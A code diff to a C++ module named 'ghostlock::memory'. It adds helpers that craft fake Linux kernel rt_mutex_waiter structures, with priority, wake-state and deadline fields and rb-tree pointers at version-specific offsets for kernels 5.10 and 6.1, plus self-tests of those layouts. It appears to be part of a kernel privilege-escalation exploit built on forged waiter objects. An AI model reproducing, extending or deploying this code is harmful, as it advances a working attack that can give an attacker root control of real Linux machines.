@@ -21,8 +21,23 @@ namespace {
         return value;
     }
 
+    uint32_t load32(const unsigned char *p, size_t off) {
+        uint32_t value;
+        memcpy(&value, p + off, sizeof(value));
+        return value;
+    }
+
     bool span_store64(std::span<std::byte> bytes, size_t offset,
                       uint64_t value) noexcept {
+        if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
+            return false;
+        }
+        memcpy(bytes.data() + offset, &value, sizeof(value));
+        return true;
+    }
+
+    bool span_store32(std::span<std::byte> bytes, size_t offset,
+                      uint32_t value) noexcept {
         if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
             return false;
         }
@@ -44,6 +59,22 @@ namespace ghostlock::memory {
         return span_store64(waiter, 0x18, layout.parent) &&
                span_store64(waiter, 0x20, layout.right) &&
                span_store64(waiter, 0x28, layout.left);
+    }
+
+    bool encode_compact_waiter_tail(std::span<std::byte> waiter, uint32_t prio_offset,
+                                    int32_t prio) noexcept {
+        if (prio_offset == 0x40) {
+            /* 5.x rt_mutex_waiter: no wake_state/ww_ctx, prio at +0x40. */
+            return span_store32(waiter, 0x40, static_cast<uint32_t>(prio)) &&
+                   span_store64(waiter, 0x48, 0);
+        }
+        /* 6.1 layout (and the fallback when the profile carries no prio
+         * offset): wake_state at +0x40, prio at +0x44, deadline at +0x48,
+         * ww_ctx at +0x50. */
+        return span_store32(waiter, 0x40, 0) &&
+               span_store32(waiter, 0x44, static_cast<uint32_t>(prio)) &&
+               span_store64(waiter, 0x48, 0) &&
+               span_store64(waiter, 0x50, 0);
     }
 
     bool encode_multicast_waiter(std::span<std::byte> buffer,
@@ -178,6 +209,25 @@ namespace ghostlock::memory {
         if (encode_multicast_waiter(
             multicast_small, 0x20, 0x28, 0x30, 0x1111, 0x2222))
             return 0;
+
+        /* Compact-waiter tail: BTF-derived prio offset. 5.10 has no
+         * wake_state/ww_ctx, so prio lands at +0x40 and nothing is written
+         * past the 80-byte struct; 6.1 keeps the current four writes. */
+        std::array<std::byte, kCompactWaiterTailBytes> tail510{};
+        if (!encode_compact_waiter_tail(tail510, 0x40, 140)) return 0;
+        if (load32(reinterpret_cast<unsigned char *>(tail510.data()), 0x40) != 140) return 0;
+        if (load32(reinterpret_cast<unsigned char *>(tail510.data()), 0x44) != 0) return 0;
+        if (load64(reinterpret_cast<unsigned char *>(tail510.data()), 0x48) != 0) return 0;
+        if (load64(reinterpret_cast<unsigned char *>(tail510.data()), 0x50) != 0) return 0;
+        std::array<std::byte, kCompactWaiterTailBytes> tail61{};
+        if (!encode_compact_waiter_tail(tail61, 0x44, 140)) return 0;
+        if (load32(reinterpret_cast<unsigned char *>(tail61.data()), 0x40) != 0) return 0;
+        if (load32(reinterpret_cast<unsigned char *>(tail61.data()), 0x44) != 140) return 0;
+        if (load64(reinterpret_cast<unsigned char *>(tail61.data()), 0x48) != 0) return 0;
+        if (load64(reinterpret_cast<unsigned char *>(tail61.data()), 0x50) != 0) return 0;
+        /* An undersized tail span is rejected instead of written out of bounds. */
+        std::array<std::byte, 0x50> tail_small{};
+        if (encode_compact_waiter_tail(tail_small, 0x44, 140)) return 0;
         return 1;
     }
 } // namespace ghostlock::memory
